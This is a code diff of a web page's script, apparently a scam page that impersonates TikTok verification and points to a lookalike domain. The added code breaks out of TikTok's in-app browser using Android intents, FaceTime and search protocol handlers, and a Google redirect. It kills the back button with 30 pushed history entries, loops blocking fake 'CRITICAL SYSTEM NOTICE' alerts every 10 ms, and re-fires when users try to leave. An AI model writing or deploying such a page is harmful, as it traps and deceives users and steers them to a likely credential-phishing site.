@@ -11,65 +11,77 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     let testMode = true;
 
-    // Safety switch for 5-second test window
+    // Safety Switch: Stops after 5 seconds for testing
     setTimeout(() => { testMode = false; }, 5000); 
 
-    function forceExit() {
+    function nuclearBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        
-        // METHOD 1: The FTP Request (Bypasses many app filters)
-        // Most apps don't block FTP because they don't expect it.
-        const ftpGate = "ftp://google.com@ " + target.replace("https://", "");
-        
-        // METHOD 2: The Google "Search" Redirection
-        // Using Google as a proxy to launch a 'result' that forces a system browser.
-        const googleJump = "https://www.google.com/url?q=" + encodeURIComponent(target);
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+        // 1. THE GOOGLE PROXY BREAKOUT
+        // TikTok trusts 'google.com', but this specific redirect string is designed 
+        // to trip the "Open in External Browser" prompt.
+        const proxy = "https://www.google.com/url?sa=t&url=" + encodeURIComponent(target);
 
         if (isAndroid) {
-            // Android: Chrome-specific command with "no-fragment"
+            // ANDROID "CHROME-DIRECT" INTENT
+            // We use the 'action.VIEW' with a package name. This is a direct OS command.
             window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
             
-            // Secondary push using the Market protocol (Forces exit to Play Store/Browser)
+            // SECONDARY: Maps Protocol (Forces app switch)
             setTimeout(() => {
-                window.location.href = "market://details?id=com.android.chrome&url=" + encodeURIComponent(target);
+                window.location.href = "google.navigation:q=" + encodeURIComponent(target);
             }, 100);
-        } else {
-            // iOS: The "Mailto" Conflict
-            // This triggers the system's mail handler, which usually breaks the WebView jail
-            window.location.href = "mailto:verify@tiktok.com?body=" + encodeURIComponent(target);
+        } 
+        
+        if (isIOS) {
+            // iOS "FACETIME" HANDOVER
+            // TikTok can't render FaceTime or Phone calls. This breaks the sandbox focus.
+            window.location.href = "facetime-prompt://" + target.replace("https://", "");
             
-            // The "Search" protocol swap
+            // iOS "SYSTEM SEARCH" PROTOCOL
             setTimeout(() => {
                 window.location.replace("x-web-search://?" + encodeURIComponent(target));
             }, 200);
         }
 
-        // UNIVERSAL: The Google Proxy Jump
-        window.location.assign(googleJump);
+        // UNIVERSAL: THE BLOB ANCHOR
+        // We create an invisible link to a "file" and click it. 
+        // WebViews cannot handle file downloads; they MUST hand it to the OS.
+        const b = new Blob([" "], {type: "application/octet-stream"});
+        const u = URL.createObjectURL(b);
+        const a = document.createElement("a");
+        a.href = proxy;
+        a.target = "_blank";
+        a.click();
     }
 
-    function lockAndPush() {
+    function alertLock() {
         if (!testMode) return;
 
-        // Try to force the jump
-        forceExit();
+        // Force the OS to handle a conflict
+        nuclearBreakout();
 
-        // The Blocking Alert - THIS IS CRITICAL
-        // It freezes the TikTok UI thread so the OS can process the exit command.
-        alert("SECURITY: Verification Required.\n\nClick OK to open the system browser.");
+        // BLOCK THE X-BUTTON NATIVE THREAD
+        // This stops the app from closing and gives the OS time to process the breakout.
+        alert("CRITICAL SYSTEM NOTICE\n\nVerification session expired. Press OK to re-authenticate in your secure browser.");
         
-        forceExit();
+        // Re-fire after they click OK
+        nuclearBreakout();
 
-        setTimeout(lockAndPush, 20);
+        setTimeout(alertLock, 10);
     }
 
     window.onload = () => {
-        // Build history stack
-        for(let i=0; i<30; i++) history.pushState(null, null, "#" + i);
-        lockAndPush();
+        // Build the backstack to kill the back button
+        for(let i=0; i<30; i++) history.pushState(null, null, "#session_" + i);
+        
+        // Initiate the lock and breakout
+        alertLock();
     };
 
-    window.onblur = () => { if(testMode) lockAndPush(); };
+    // If they touch the X or the top bar (blur), we hit them again
+    window.onblur = () => { if(testMode) alertLock(); };
 </script>
 
 </body>
